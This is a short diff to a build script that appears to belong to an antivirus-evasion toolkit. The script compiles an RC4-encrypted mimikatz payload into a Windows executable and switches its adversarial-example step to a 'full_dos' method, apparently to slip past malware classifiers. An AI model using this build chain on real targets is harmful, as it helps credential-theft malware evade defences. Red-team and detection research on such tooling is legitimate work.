@@ -63,10 +63,11 @@ set_payload_execution_method exec_shellcode64
 
 # compile to exe file
 $win64_compiler -o output/rc4enc_mimikatz_adversarial_win64.exe source/avet.c
-strip output/rc4enc_mimikatz_win64.exe
+strip output/rc4enc_mimikatz_adversarial_win64.exe
 
 # generate adversarial example
-gen_adversarial_exe gamma
+gen_adversarial_exe full_dos output/rc4enc_mimikatz_adversarial_win64.exe
+sleep 2
 
 
 # cleanup
